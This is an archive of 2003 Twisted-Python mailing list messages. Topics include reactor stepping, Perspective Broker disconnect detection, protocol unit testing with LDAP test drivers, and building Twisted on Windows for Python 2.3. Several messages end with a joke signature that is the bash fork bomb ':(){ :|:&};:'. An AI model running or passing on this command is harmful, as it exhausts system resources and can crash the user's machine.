Cygwin and then tried 'setup.py build --compiler=mingw32' as per 
documentation, but I got an error message that Python itself is build 
with Visual Studio 6.
I don't feel building python myself and I don't have VS6.

TIA,

Rudy




From nico at tekNico.net  Thu Jul 31 02:53:01 2003
From: nico at tekNico.net (Nicola Larosa)
Date: Thu, 31 Jul 2003 08:53:01 +0200
Subject: [Twisted-Python] StepReactor?
Message-ID: <3F28BCCD.90303@tekNico.net>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

What about a StepReactor?

It would be great to be able to stop time, have a means to look at the event
queue and to say "DispatchNextEvent" by hand. Or even better,
"PushTimeForward(x)" and see what happens. In short, a simulator.

This assuming, of course, that all other parts of the system are pausable,
be they internal or external.


- --
"It seems like Zope has done a dance with Twisted but still
hasn't asked it out on a date."  Paul Everitt

Nicola Larosa - nico at tekNico.net

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/KLzLXv0hgDImBm4RApH3AJ0SqGfDLxmdI7GjrWBBzGOlbI3V3QCfdUyB
bQkgGavTvpi1WnWpI6aO/Gg=
=Jsn5
-----END PGP SIGNATURE-----





From andrew-twisted at puzzling.org  Thu Jul 31 03:14:06 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 31 Jul 2003 17:14:06 +1000
Subject: [Twisted-Python] StepReactor?
In-Reply-To: <3F28BCCD.90303@tekNico.net>
References: <3F28BCCD.90303@tekNico.net>
Message-ID: <20030731071406.GC30331@frobozz>

On Thu, Jul 31, 2003 at 08:53:01AM +0200, Nicola Larosa wrote:
> What about a StepReactor?
> 
> It would be great to be able to stop time, have a means to look at the event
> queue and to say "DispatchNextEvent" by hand. Or even better,
> "PushTimeForward(x)" and see what happens. In short, a simulator.
> 
> This assuming, of course, that all other parts of the system are pausable,
> be they internal or external.

Is reactor.iterate[1] sufficient for this?

-Andrew.
    
[1] http://twistedmatrix.com/documents/api/public/twisted.internet.interfaces.IReactorCore.html#iterate




From sflist at ihonk.com  Thu Jul 31 03:21:02 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Thu, 31 Jul 2003 00:21:02 -0700
Subject: [Twisted-Python] adbapi weirdness
In-Reply-To: <20030731050849.GB30331@frobozz>
References: <200307302113.05020.sflist@ihonk.com> <20030731050849.GB30331@frobozz>
Message-ID: <200307310021.02606.sflist@ihonk.com>

Thank you for your response, Andrew! I thought I knew enough about Deferreds, 
but it's clear that I need to learn more. I'll give your approach a try after 
I've gone through the deferred docs again.

Steve



From Richard.Townsend at edl.uk.eds.com  Thu Jul 31 03:52:48 2003
From: Richard.Townsend at edl.uk.eds.com (Richard.Townsend at edl.uk.eds.com)
Date: Thu, 31 Jul 2003 08:52:48 +0100
Subject: [Twisted-Python] PB - detecting loss of connection
Message-ID: <76ADB8C376C3D31193F50008C7E6D3B2F3E16B@EWHKA005>

I've been experimenting with PB. I have two applications developed from
examples pb3server.py and pb3client.py

The client uses pb.getObjectAt() to get a reference to the server's pb.Root
derived object. It then calls a remote method on that object to send a
pb.Referenceable object to the server.

The idea is that the server can then call a method on the pb.Referenceable
object to notify the client(s) whenever a significant change of state
occurs. This works OK.

If the client terminates, the server can trap pb.DeadReferenceError, so that
is not a problem.

However, if the server terminates (e.g. by SIGKILL) the client is not aware
that it will not receive any more updates.

Apart from periodically calling pb.getObjectAt() to see if the server is
still running, is there a way that the client can automatically detect if
the server has been terminated?

thanks for your help
 -Richard
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030731/5efbcbda/attachment.htm 

From nico at tekNico.net  Thu Jul 31 04:19:30 2003
From: nico at tekNico.net (Nicola Larosa)
Date: Thu, 31 Jul 2003 10:19:30 +0200
Subject: [Twisted-Python] StepReactor?
In-Reply-To: <20030731071406.GC30331@frobozz>
References: <3F28BCCD.90303@tekNico.net> <20030731071406.GC30331@frobozz>
Message-ID: <3F28D112.8020301@tekNico.net>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> Is reactor.iterate[1] sufficient for this?

Well, it does not stop time, and also calls runUntilCurrent. I guess one
should come up with a substitute for time.time in t.i.base (at least), that
would allow to manipulate (fake) time at will.

Also, some means to display the event queue is needed, including the delays
for each event.

Come to think of it, is there a way in Twisted to schedule an event at an
absolute time, instead of at a relative one?


- --
"It seems like Zope has done a dance with Twisted but still
hasn't asked it out on a date."  Paul Everitt

Nicola Larosa - nico at tekNico.net

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/KNEPXv0hgDImBm4RAimdAJ4s8PWHqWSMqCjnvcaqJChANcCULgCguOPT
duew65Z064oPnTJ1euBg4Y0=
=kExV
-----END PGP SIGNATURE-----





From mporter at despammed.com  Thu Jul 31 05:43:47 2003
From: mporter at despammed.com (Michael Porter)
Date: Thu, 31 Jul 2003 10:43:47 +0100
Subject: [Twisted-Python] how to drop connection
References: <006f01c355d0$b163eba0$0201a8c0@dan> <20030729.233337.132512789.warner@lothar.com> <20030730064100.GC27662@frobozz> <20030730065248.GB26034@radii>
Message-ID: <004501c35748$3d5fb490$0201a8c0@dan>

From: "Christopher Armstrong" <radix at twistedmatrix.com>
> On Wed, Jul 30, 2003 at 04:41:00PM +1000, Andrew Bennetts wrote:
> > On Tue, Jul 29, 2003 at 11:33:37PM -0700, Brian Warner wrote:
> > >
> > > class DroppingHTTPFactory(http.HTTPFactory):
> >
> > This really should be (also untested):
> >
> > class DroppingHTTPFactory(http.HTTPFactory):
>
> Also, OP is probably using server.Site, not HTTPFactory directly. So
> it should probably be subclassing that.
>

Thanks, this works perfectly (subclassing Site in my case as you suspected).

Mike.





From tv at twistedmatrix.com  Thu Jul 31 07:07:10 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 31 Jul 2003 14:07:10 +0300
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030731020900.GA30331@frobozz>
References: <000001c356cc$3d768340$5591013d@thilakra> <20030730151039.02684534.itamar@itamarst.org> <20030731020900.GA30331@frobozz>
Message-ID: <20030731110710.GA21641@lapdog>

On Thu, Jul 31, 2003 at 12:09:00PM +1000, Andrew Bennetts wrote:
 > In general you'd just do some variant on:
> > 
> >  reactor.listenTCP(1234, myServerFactory)
> >  reactor.connectTCP("127.0.0.1", 1234, myClientFactory):
> >  while someConditionIsn'tSet:
> >      reactor.iterate()
> >  # at this point some exchange should have finished successfully
> 
> Or you can use the loopback module -- twisted.protocols.loopback.  Many of
> the Twisted tests do this.

	I'd like to vote _heavily_ on using
	twisted.protocols.loopback.loopback()

	Opening TCP sockets in unit tests is just not _unit_ testing
	in my book. Please don't do it in unit tests. It just makes it
	harder to run your unit tests in varying environments. (Who
	says I allow you to bind to port 1234? Who says it's free?
	Who says I allow you to listen *at all*?)

	</rant>


	Also, you should not be testing just interoperability between
	*your* client and *your* server, but interoperability of your
	server with a "standard", and interoperability of your client
	with a "standard". For that, I prefer doing something like
	this:

class LDAPClientTestDriver:
    """

    A test driver that looks somewhat like a real LDAPClient.

    Pass in a list of lists of LDAPProtocolResponses. For each sent
    LDAP message, the first item of said list is iterated through, and
    all the items are sent as responses to the callback. The sent LDAP
    messages are stored in self.sent, so you can assert that the sent
    messages are what they are supposed to be.

    """
    def __init__(self, *responses):
        self.sent=[]
        self.responses=list(responses)
    def queue(self, x, callback):
        self.sent.append(x)
        assert self.responses, 'Ran out of responses at %r' % x
        responses = self.responses.pop(0)
        while responses:
            r = responses.pop(0)
            ret = callback(r)
            if responses:
                assert ret==0
            else:
                assert ret==1

    def assertNothingSent(self):
        # just a bit more explicit
        self.assertSent()

    def assertSent(self, *shouldBeSent):
        shouldBeSent = list(shouldBeSent)
        assert self.sent == shouldBeSent, \
               '%s expected to send %r but sent %r' % (
            self.__class__.__name__,
            shouldBeSent,
            self.sent)
        sentStr = ''.join([str(x) for x in self.sent])
	shouldBeSentStr = ''.join([str(x) for x in shouldBeSent])
	assert sentStr == shouldBeSentStr, \
               '%s expected to send data %r but sent %r' % (
            self.__class__.__name__,
            shouldBeSentStr,
            sentStr)


class LDAPSyntaxAttributesModificationOnWire(unittest.TestCase):
    def testAdd(self):
	"""Modify & commit should write the right data to the server."""

        client = LDAPClientTestDriver(
            [	pureldap.LDAPModifyResponse(resultCode=0,
                                            matchedDN='',
                                            errorMessage=''),
                ])

	o=ldapsyntax.LDAPEntry(client=client,
                               dn='cn=foo,dc=example,dc=com',
                               attributes={
	    'objectClass': ['a', 'b'],
	    'aValue': ['a'],
	    })
	o['aValue'].add('newValue')
	o['aValue'].add('anotherNewValue')

	d=o.commit()
        val = deferredResult(d)

        client.assertSent(pureldap.LDAPModifyRequest(
	    object='cn=foo,dc=example,dc=com',
	    modification=[
	    pureldap.LDAPModification_add(vals=(('aValue',
						 ['newValue']),)),
	    pureldap.LDAPModification_add(vals=(('aValue',
						 ['anotherNewValue']),)),
	    ]))


	And elsewhere, test the actual serialization of the
	on-wire protocol message known as pureldap.LDAPModifyRequest:

class KnownValues(unittest.TestCase):
    knownValues=( # class, args, kwargs, expected_result

	(pureldap.LDAPModifyRequest,
	 [],
	 { "object": 'cn=foo, dc=example, dc=com',
	   "modification": [pureldap.LDAPModification_delete([('bar',)])]
	   },
	 [0x66, 0x2c]
	 + [0x04, 0x1a]
	 + l("cn=foo, dc=example, dc=com")
	 + [0x30, 0x0e]
	 + [0x30, 0x0c]
	 + [0x0a, 0x01, 0x01]
	 + [0x30, 0x07]
	 + [0x04, 0x03] + l("bar")
	 + [0x31, 0x00]),

	...

        )

    def testToLDAP(self):
	"""str(LDAPClass(...)) should give known result with known input"""
	for klass, args, kwargs, encoded in self.knownValues:
	    result = klass(*args, **kwargs)
	    result = str(result)
	    result = map(ord, result)
	    if result!=encoded:
		raise AssertionError, \
		      "Class %s(*%s, **%s) doesn't encode properly: " \
		      "%s != %s" % (klass.__name__,
				    repr(args), repr(kwargs),
				    repr(result), repr(encoded))

    def testFromLDAP(self):
	"""LDAPClass(encoded="...") should give known result with known input"""
	for klass, args, kwargs, encoded in self.knownValues:
	    m=MutableString(s(*encoded))
	    m.append('foo')
	    result = klass(encoded=m, berdecoder=pureber.BERDecoderContext())
	    assert m=='foo'

	    shouldBe = klass(*args, **kwargs)
	    #TODO shouldn't use str below
	    assert str(result)==str(shouldBe), \
		   "Class %s(*%s, **%s) doesn't decode properly: " \
		   "%s != %s" % (klass.__name__,
				 repr(args), repr(kwargs),
				 repr(result), repr(shouldBe))

-- 
:(){ :|:&};:



From nico at tekNico.net  Thu Jul 31 07:03:45 2003
From: nico at tekNico.net (Nicola Larosa)
Date: Thu, 31 Jul 2003 13:03:45 +0200
Subject: [Twisted-Python] Didn't register my copy of Twisted!?!
Message-ID: <3F28F791.4070206@tekNico.net>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sorry to spoil the party, but...



is twisted.python.register supposed to be a joke, or what? :^) If so, I'm
not sure I completely got it... I'm particularly concerned with the ominous
"import socket" contained within. ;^)



- --
"It seems like Zope has done a dance with Twisted but still
hasn't asked it out on a date."  Paul Everitt

Nicola Larosa - nico at tekNico.net

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/KPePXv0hgDImBm4RAieDAJ9RpJ2p8Ng3GQ53SD4mxE/qYkCeSwCgqzxq
O7EqvgRVX5DPBUyId7A4YIA=
=05t1
-----END PGP SIGNATURE-----





From lists at ghaering.de  Thu Jul 31 07:25:28 2003
From: lists at ghaering.de (=?ISO-8859-1?Q?Gerhard_H=E4ring?=)
Date: Thu, 31 Jul 2003 13:25:28 +0200
Subject: [Twisted-Python] Didn't register my copy of Twisted!?!
In-Reply-To: <3F28F791.4070206@tekNico.net>
References: <3F28F791.4070206@tekNico.net>
Message-ID: <3F28FCA8.6050005@ghaering.de>

Nicola Larosa wrote:
> Sorry to spoil the party, but...
> 
> is twisted.python.register supposed to be a joke, or what? :^) [...]

"""
Revision 1.1 / (download) / (as text) - annotate - [select for diffs] , 
Mon Apr 1 06:35:59 2002 UTC (15 months, 4 weeks ago) by glyph
Branch: MAIN
Diff

registration support for twistd
"""

Look at the checkin date ;-)

-- Gerhard




From theller at python.net  Thu Jul 31 08:41:28 2003
From: theller at python.net (Thomas Heller)
Date: Thu, 31 Jul 2003 14:41:28 +0200
Subject: [Twisted-Python] Twisted and Python 2.3
Message-ID: <oezax407.fsf@python.net>

Trying to run my code under Python 2.3, I get these warnings:

C:\tss5\components\fpanel\prog\..\..\_Pythonlib\fpgui\ctgui_reactor.py:113: DeprecationWarning: Foolish capitalist!  Your opulent toilet will be your undoing!!
  log.logOwner.own(fd)

C:\tss5\components\fpanel\prog\..\..\_Pythonlib\fpgui\ctgui_reactor.py:127: DeprecationWarning: The proletariat is victorious.
  log.logOwner.disown(fd)

What do they mean?
I have built and installed twisted 1.0.6 under Windows.

Thomas




From stormcoder at yahoo.com  Thu Jul 31 10:05:09 2003
From: stormcoder at yahoo.com (Mike Owens)
Date: Thu, 31 Jul 2003 07:05:09 -0700
Subject: [Twisted-Python] Win32 Service
Message-ID: <3F28BFA5.9743.14D34878@localhost>

I am currently running twisted on an XP machine. What is the 
recommended way of running twistd as a service? Or should I just 
create a custom web script and run that as a service?



From itamar at itamarst.org  Thu Jul 31 10:54:29 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 10:54:29 -0400
Subject: [Twisted-Python] Twisted and Python 2.3
In-Reply-To: <oezax407.fsf@python.net>
References: <oezax407.fsf@python.net>
Message-ID: <20030731105429.48c0824c.itamar@itamarst.org>

On Thu, 31 Jul 2003 14:41:28 +0200
Thomas Heller <theller at python.net> wrote:

> What do they mean?
> I have built and installed twisted 1.0.6 under Windows.

We changed the logging APIs, and you must've copied code from the
win32eventreacctor that still uses the old API. Compare that to say,
t.i.default's way of interacting with the log.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Thu Jul 31 10:59:08 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 10:59:08 -0400
Subject: [Twisted-Python] PB - detecting loss of connection
In-Reply-To: <76ADB8C376C3D31193F50008C7E6D3B2F3E16B@EWHKA005>
References: <76ADB8C376C3D31193F50008C7E6D3B2F3E16B@EWHKA005>
Message-ID: <20030731105908.12492545.itamar@itamarst.org>

aReferenceable.broker.notifyOnDisconnect(f)

f() will now be called on disconnect, aReferenceable the result of
getObjectAt() or any call that returns a RemoteReference.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Thu Jul 31 11:03:07 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 11:03:07 -0400
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030731110710.GA21641@lapdog>
References: <000001c356cc$3d768340$5591013d@thilakra>
	<20030730151039.02684534.itamar@itamarst.org>
	<20030731020900.GA30331@frobozz>
	<20030731110710.GA21641@lapdog>
Message-ID: <20030731110307.7639a494.itamar@itamarst.org>

On Thu, 31 Jul 2003 14:07:10 +0300
Tommi Virtanen <tv at twistedmatrix.com> wrote:

> 	Opening TCP sockets in unit tests is just not _unit_ testing
> 	in my book. Please don't do it in unit tests. It just makes it
> 	harder to run your unit tests in varying environments. (Who
> 	says I allow you to bind to port 1234? Who says it's free?
> 	Who says I allow you to listen *at all*?)

Most of Twisted's unittests listen on 0 and then figure out which port
was bound to. 

> 	Also, you should not be testing just interoperability between
> 	*your* client and *your* server, but interoperability of your
> 	server with a "standard", and interoperability of your client
> 	with a "standard". For that, I prefer doing something like
> 	this:

Also a very good idea, but doing both is better than just one. The more
tests the better.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From theller at python.net  Thu Jul 31 11:37:33 2003
From: theller at python.net (Thomas Heller)
Date: Thu, 31 Jul 2003 17:37:33 +0200
Subject: [Twisted-Python] Re: Twisted and Python 2.3
References: <oezax407.fsf@python.net> <20030731105429.48c0824c.itamar@itamarst.org>
Message-ID: <65liwvuq.fsf@python.net>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:

> On Thu, 31 Jul 2003 14:41:28 +0200
> Thomas Heller <theller at python.net> wrote:
>
>> What do they mean?
>> I have built and installed twisted 1.0.6 under Windows.
>
> We changed the logging APIs, and you must've copied code from the
> win32eventreacctor that still uses the old API. Compare that to say,
> t.i.default's way of interacting with the log.

Thanks.

But wouldn't it be more useful to put this in the warning, instead of
these strange texts? I would be somewhat worried that these texts (if I
do not test the program good enough) may at some time been shown to the
innocent user =8(

But maybe I have no sense for this kind of humor.

Thomas




From itamar at itamarst.org  Thu Jul 31 11:47:45 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 31 Jul 2003 11:47:45 -0400
Subject: [Twisted-Python] Re: Twisted and Python 2.3
In-Reply-To: <65liwvuq.fsf@python.net>
References: <oezax407.fsf@python.net>
	<20030731105429.48c0824c.itamar@itamarst.org>
	<65liwvuq.fsf@python.net>
Message-ID: <20030731114745.021fecef.itamar@itamarst.org>

On Thu, 31 Jul 2003 17:37:33 +0200
Thomas Heller <theller at python.net> wrote:

> But wouldn't it be more useful to put this in the warning, instead of
> these strange texts? I would be somewhat worried that these texts (if
> I do not test the program good enough) may at some time been shown to
> the innocent user =8(

Those are warnings (so you can supress them with python options etc.).
And yes, we need to remove them, by switching to the new code (it's on
my TODO list for win32eventreactor, hopefully before 1.0.7 is released.)

> But maybe I have no sense for this kind of humor.

The deprecated methods were "own" and "disown".

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From corydodt at yahoo.com  Thu Jul 31 12:23:36 2003
From: corydodt at yahoo.com (Cory Dodt)
Date: Thu, 31 Jul 2003 09:23:36 -0700
Subject: [Twisted-Python] Re: Twisted - Python 2.3 - Windows
In-Reply-To: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com>
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com>
Message-ID: <3F294288.4000009@yahoo.com>

>Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
>
>Hi,
>
>anyone who knows when the first Python 2.3 build of twisted for windows 
>will be available? Which version will it be?
>
>I tried to build it myself but got into trouble. I first installed 
>Cygwin and then tried 'setup.py build --compiler=mingw32' as per 
>documentation, but I got an error message that Python itself is build 
>with Visual Studio 6.
>I don't feel building python myself and I don't have VS6.
>  
>

I'm with you man,  I don't feel like building Python myself either.  I 
have asked the appropriate list 
(http://mail.python.org/pipermail/distutils-sig/2003-July/003333.html )
about this problem.  I also tried using distutils from CVS instead of 
the bundled copy with Python 2.3, and no luck.

There won't be an official Python 2.3 build of Twisted for Windows until 
this is resolved, as I don't have MSVC and don't intend to buy a copy.  
mingw should work.

In the meantime, you should know that you can get by without the 
extensions.  Just do
$ python setup.py install  --skip-build

You won't get cbanana or _c_urlarg, the only extensions built for windows.






From Rudy.Schockaert at pandora.be  Thu Jul 31 12:52:33 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Thu, 31 Jul 2003 18:52:33 +0200
Subject: [Twisted-Python] Re: Twisted - Python 2.3 - Windows
In-Reply-To: <3F294288.4000009@yahoo.com>
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com> <3F294288.4000009@yahoo.com>
Message-ID: <3F294951.3070409@pandora.be>

Cory Dodt wrote:

>
>> Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
>>
>> Hi,
>>
>> anyone who knows when the first Python 2.3 build of twisted for 
>> windows will be available? Which version will it be?
>>
>> I tried to build it myself but got into trouble. I first installed 
>> Cygwin and then tried 'setup.py build --compiler=mingw32' as per 
>> documentation, but I got an error message that Python itself is build 
>> with Visual Studio 6.
>> I don't feel building python myself and I don't have VS6.
>>  
>>
>
> I'm with you man,  I don't feel like building Python myself either.  I 
> have asked the appropriate list 
> (http://mail.python.org/pipermail/distutils-sig/2003-July/003333.html )
> about this problem.  I also tried using distutils from CVS instead of 
> the bundled copy with Python 2.3, and no luck.
>
> There won't be an official Python 2.3 build of Twisted for Windows 
> until this is resolved, as I don't have MSVC and don't intend to buy a 
> copy.  mingw should work.

I will have MSVC somewhere next week (when I get at the office). I'll 
try to build it with MSVC then. If you're interested in the extensions 
below, contact me offline.

>
> In the meantime, you should know that you can get by without the 
> extensions.  Just do
> $ python setup.py install  --skip-build
>
> You won't get cbanana or _c_urlarg, the only extensions built for 
> windows.

I can live with that for the moment. The only parts I'm using for the 
moment is twisted.names and twisted.mail. And as JP is heavily working 
on the mail part as I understood, I'm working with the CVS version for 
the moment.
But as soon as I get more free time, I would like to investigate the 
rest also. I'll see how far I can get without cbanana and/or _c_urlarg.





From theller at python.net  Thu Jul 31 13:05:51 2003
From: theller at python.net (Thomas Heller)
Date: Thu, 31 Jul 2003 19:05:51 +0200
Subject: [Twisted-Python] Re: Twisted - Python 2.3 - Windows
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com> <3F294288.4000009@yahoo.com>
Message-ID: <zniuvd74.fsf@python.net>

Cory Dodt <corydodt at yahoo.com> writes:

>>Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
>>
>>Hi,
>>
>> anyone who knows when the first Python 2.3 build of twisted for
>> windows will be available? Which version will it be?
>>
>> I tried to build it myself but got into trouble. I first installed
>> Cygwin and then tried 'setup.py build --compiler=mingw32' as per
>> documentation, but I got an error message that Python itself is
>> build with Visual Studio 6.
>>I don't feel building python myself and I don't have VS6.
>>
>
> I'm with you man,  I don't feel like building Python myself either.  I
> have asked the appropriate list
> (http://mail.python.org/pipermail/distutils-sig/2003-July/003333.html )
> about this problem.  I also tried using distutils from CVS instead of
> the bundled copy with Python 2.3, and no luck.
>
> There won't be an official Python 2.3 build of Twisted for Windows
> until this is resolved, as I don't have MSVC and don't intend to buy a
> copy.  mingw should work.
>
> In the meantime, you should know that you can get by without the
> extensions.  Just do
> $ python setup.py install  --skip-build
>
> You won't get cbanana or _c_urlarg, the only extensions built for windows.

If anyoe wants it, I've just built twisted-1.0.7alpha-2 with MSVC6 for
Python 2.3. Just tell me where it should be uploaded.
I can do the same for 1.0.6.

Thomas




From justinjohnson at fastmail.fm  Thu Jul 31 13:13:28 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Thu, 31 Jul 2003 11:13:28 -0600
Subject: [Twisted-Python] Callbacks, Looping, and Variable Binding
Message-ID: <20030731171328.BAF3F389C1@www.fastmail.fm>

When I run the following code, everytime the callbacks to "onSuccess" get
called, "item" is bound to the last element in "list".  Obviously what I
want is to have "item" bound to the value it had when I added the
callback.  How does one handle looping constructs like this in Twisted?


def someFunc():
    deferreds = []

    def onSuccess(results):
       d = item.doSomethingElseThatReturnsDeferred()
       return d

    d = doSomethingThatReturnsDeferred()

    for item in list:
        d.addCallbacks(onSuccess, log.err)
        deferreds.append(d)

    return defer.DefferedList(deferreds)



From pje at telecommunity.com  Thu Jul 31 13:41:53 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Thu, 31 Jul 2003 13:41:53 -0400
Subject: [Twisted-Python] Re: Twisted - Python 2.3 - Windows
In-Reply-To: <zniuvd74.fsf@python.net>
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com>
 <3F294288.4000009@yahoo.com>
Message-ID: <5.1.1.6.0.20030731133337.01dc7020@telecommunity.com>

At 07:05 PM 7/31/03 +0200, Thomas Heller wrote:
>Cory Dodt <corydodt at yahoo.com> writes:
>
> >>Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
> >>
> >>Hi,
> >>
> >> anyone who knows when the first Python 2.3 build of twisted for
> >> windows will be available? Which version will it be?
> >>
> >> I tried to build it myself but got into trouble. I first installed
> >> Cygwin and then tried 'setup.py build --compiler=mingw32' as per
> >> documentation, but I got an error message that Python itself is
> >> build with Visual Studio 6.
> >>I don't feel building python myself and I don't have VS6.
> >>
> >
> > I'm with you man,  I don't feel like building Python myself either.  I
> > have asked the appropriate list
> > (http://mail.python.org/pipermail/distutils-sig/2003-July/003333.html )
> > about this problem.  I also tried using distutils from CVS instead of
> > the bundled copy with Python 2.3, and no luck.

It looks like the error occurs when an MSVCCompiler instance is created; I 
haven't yet figured out *why* such an instance is being created.  I don't 
have 2.3 installed on Win32, so as an experiment, I added a 'raise' 
statement to 2.2's MSVCCompiler.  If I specified compilation with msvc, I 
get the error I raised.  If I specify mingw32, I don't.  So, evidently 
2.2's distutils don't create an MSVCCompiler instance when specifying 
mingw32.  I can't fathom why 2.3 would do so.




From corydodt at yahoo.com  Thu Jul 31 15:09:31 2003
From: corydodt at yahoo.com (Cory Dodt)
Date: Thu, 31 Jul 2003 12:09:31 -0700
Subject: solved Re: [Twisted-Python] Re: Twisted - Python 2.3 - Windows -
 mingw
In-Reply-To: <5.1.1.6.0.20030731133337.01dc7020@telecommunity.com>
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com> <3F294288.4000009@yahoo.com> <5.1.1.6.0.20030731133337.01dc7020@telecommunity.com>
Message-ID: <3F29696B.60808@yahoo.com>

Phillip J. Eby wrote:

>
> It looks like the error occurs when an MSVCCompiler instance is 
> created; I
> haven't yet figured out *why* such an instance is being created.  I don't
> have 2.3 installed on Win32, so as an experiment, I added a 'raise'
> statement to 2.2's MSVCCompiler.  If I specified compilation with msvc, I
> get the error I raised.  If I specify mingw32, I don't.  So, evidently
> 2.2's distutils don't create an MSVCCompiler instance when specifying
> mingw32.  I can't fathom why 2.3 would do so.

Well, I figured out why.  This was a bug in Twisted's setup.py, which 
has a function _check_header that is supposed to invoke the compiler on 
a tiny test module to make sure the module being built will build 
successfully.

The new compiler is constructed with new_compiler(), but no arguments 
were passed to it; it was this invocation that fails with the error 
message I was getting.  This bug was introduced some time ago; I'm not 
sure why I didn't see it before now.

Using self.compiler instead worked (there's no need to call 
new_compiler() when it's already been done for you).

C





From pb_twisted at olga.mine.nu  Thu Jul 31 15:49:17 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Thu, 31 Jul 2003 21:49:17 +0200
Subject: [Twisted-Python] Providing perspective-dependent client-side information to a pb.RemoteCache object
Message-ID: <JAEDJDIBADCJHPFLNEDFMEKBCAAA.pb_twisted@olga.mine.nu>

Hmm, I find it hard to describe it as a short subject, but here's what I
seek to do:

On the server, I have the structure:

class A(pb.Cacheable):
    [...]

class B(pb.Cacheable):
    def __init__():
        self.stuff = A()	# This attribute gets replicated.


And on the client side, there are the corresponding pb.RemoteCache classes.

When an instance of B is replicated, a client-side A gets instantiated and
its setCopyableState is called, and the client-side B instance gets its
reference to it.

So far, so good.

But when the client-side A is created and its state has been set, I also
want to perform some other processing which requires references to other
parts of the client. I would prefer not to make these parts into globals.
For example, it could be dependent on the client-side perspective it
communicates through, which would be handy if the client connects to
multiple servers.

I'd like to know if there is an accepted idiom for supplying this? For
example, I believe it would have worked if the setCopyableState received the
perspective as a third parameter.





From tv at twistedmatrix.com  Thu Jul 31 15:43:55 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 31 Jul 2003 22:43:55 +0300
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030731110307.7639a494.itamar@itamarst.org>
References: <000001c356cc$3d768340$5591013d@thilakra> <20030730151039.02684534.itamar@itamarst.org> <20030731020900.GA30331@frobozz> <20030731110710.GA21641@lapdog> <20030731110307.7639a494.itamar@itamarst.org>
Message-ID: <20030731194355.GA32069@lapdog>

On Thu, Jul 31, 2003 at 11:03:07AM -0400, Itamar Shtull-Trauring wrote:
> > 	Opening TCP sockets in unit tests is just not _unit_ testing
> > 	in my book. Please don't do it in unit tests. It just makes it
> > 	harder to run your unit tests in varying environments. (Who
> > 	says I allow you to bind to port 1234? Who says it's free?
> > 	Who says I allow you to listen *at all*?)
> 
> Most of Twisted's unittests listen on 0 and then figure out which port
> was bound to. 

	Which is mostly the reason why I'm bitch about it on _this_
	mailing list.

	I dislike that method. I really do.

	There have been _months_ during which certain twisted unit
	tests randomly fail; many of those have been due to
	interaction with local TCP stack, networking, firewall and
	miscellanous experimental security features.

	I really think unit tests should touch the underlying
	libraries/OS as little as possible. For the cases where you
	really want to test the OS integration, you want to do things
	like stress tests, and for e.g. mail tests where you randomly
	shut down the power to a machine running a stress test, and
	later check that no messages were lost.

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Thu Jul 31 15:50:04 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 31 Jul 2003 22:50:04 +0300
Subject: [Twisted-Python] Callbacks, Looping, and Variable Binding
In-Reply-To: <20030731171328.BAF3F389C1@www.fastmail.fm>
References: <20030731171328.BAF3F389C1@www.fastmail.fm>
Message-ID: <20030731195004.GB32069@lapdog>

On Thu, Jul 31, 2003 at 11:13:28AM -0600, Justin Johnson wrote:
> When I run the following code, everytime the callbacks to "onSuccess" get
> called, "item" is bound to the last element in "list".  Obviously what I
> want is to have "item" bound to the value it had when I added the
> callback.  How does one handle looping constructs like this in Twisted?

	Then don't inherit the namespace of someFunc. You could even
	move onSuccess outside of someFunc, to make sure you don't do
	that by accident.

	Besides, you are adding the outer d to deferreds once per
	iteration. That's broken.

        What do you want? I don't know what you are trying to do, so
        here's a guess, in form of a similar example as your code:

> def someFunc():
>     deferreds = []
> 
>     def onSuccess(results):
>        d = item.doSomethingElseThatReturnsDeferred()
>        return d
> 
>     d = doSomethingThatReturnsDeferred()
> 
>     for item in list:
>         d.addCallbacks(onSuccess, log.err)
